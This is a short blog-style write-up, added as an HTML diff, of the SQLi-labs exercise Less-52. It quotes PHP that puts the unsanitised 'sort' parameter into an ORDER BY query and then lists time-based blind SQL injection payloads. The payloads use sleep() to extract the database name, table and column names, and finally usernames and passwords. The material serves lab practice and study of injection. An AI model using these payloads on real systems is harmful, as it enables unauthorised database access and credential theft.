@@ -1,0 +1,32 @@
+<hr>
+<h2 id="title-less52url-https-www-yuque-com-u29002979-ep2zrx-pmhngqo034wlqszf"><a href="#title-less52url-https-www-yuque-com-u29002979-ep2zrx-pmhngqo034wlqszf" class="headerlink" title="title: less52url: https://www.yuque.com/u29002979/ep2zrx/pmhngqo034wlqszf"></a>title: less52<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/pmhngqo034wlqszf">https://www.yuque.com/u29002979/ep2zrx/pmhngqo034wlqszf</a></h2><pre><code class="bash">$id=$_GET[&#39;sort&#39;];	
+
+
+$sql=&quot;SELECT * FROM users ORDER BY $id&quot;;
+/* execute multi query */
+if (mysqli_multi_query($con1, $sql))
+</code></pre>
+<p>没有报错回显，还是时间盲注  ，数字型</p>
+<p><a name="ukBAB"></a></p>
+<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><pre><code class="bash">拆解数据库名称长度
+?sort=1 and if(length(database())=8,sleep(3),0)--+
+
+猜解数据库名称 
+?sort=1 and if(ascii(mid(database(),1,1))&lt;=135,sleep(3),0)--+
+
+猜解数据表名称长度
+?sort=1 and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29,sleep(3),0)--+
+
+猜解数据表名称
+?sort=1 and if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)=&#39;e&#39;,sleep(3),0)--+
+
+
+猜解字段名称长度
+?sort=1 and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))=20,sleep(3),0)#
+
+猜解字段名称
+?sort=1 and if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1)=&#39;i&#39;,sleep(3),0)--+
+
+猜解字段内容
+?sort=1 and if(mid((select group_concat(username,0x7e,password) from users),1,1)=&#39;D&#39;,sleep(3),0)--+
+</code></pre>
